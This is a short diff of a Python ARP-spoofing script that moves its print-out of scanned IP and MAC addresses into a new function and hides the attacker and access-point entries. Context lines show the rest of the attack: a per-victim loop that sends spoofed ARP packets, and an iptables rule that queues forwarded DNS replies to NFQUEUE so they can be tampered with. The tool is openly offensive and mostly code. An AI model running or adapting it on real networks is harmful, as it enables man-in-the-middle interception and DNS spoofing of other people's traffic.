@@ -61,15 +61,9 @@ def scan_net(ip):
 		vmac.append(line[3])
 		lines = stream.readline()
 	
-	sys.stdout.write("{:<20}{:<20}\n".format("IP", "MAC Address"))
-	for i in range(len(vip)):
-		sys.stdout.write("{:<20}{:<20}\n".format(vip[i], vmac[i]))
-
-
-	print("\nscan network completed.")
-	print("="*23)
-
 	return vip,vmac
+
+
 
 
 def arp():
@@ -77,7 +71,9 @@ def arp():
 
 	vip, vmac = scan_net(attacker_ip)
 	
-	ap_ip, ap_mac = ap(vip,vmac)
+	ap_ip, ap_mac = ap(vip, vmac)
+
+	print_addr(vip, vmac, attacker_ip, ap_ip)
 
 	for v in range(len(vip)):
 		for i in range(10):
@@ -88,6 +84,18 @@ def arp():
 	print("\narp spoofing completed.")
 	print("="*23)
 	
+
+def print_addr(vip, vmac, attacker_ip, ap_ip):
+	sys.stdout.write("{:<20}{:<20}\n".format("IP", "MAC Address"))
+	for i in range(len(vip)):
+		if vip[i] == attacker_ip or vip[i] == ap_ip:
+    			continue
+		sys.stdout.write("{:<20}{:<20}\n".format(vip[i], vmac[i]))
+
+
+	print("\nscan network completed.")
+	print("="*23)
+
 
 def iptables_queue():
 	subprocess.run('sudo iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 1', shell=True)
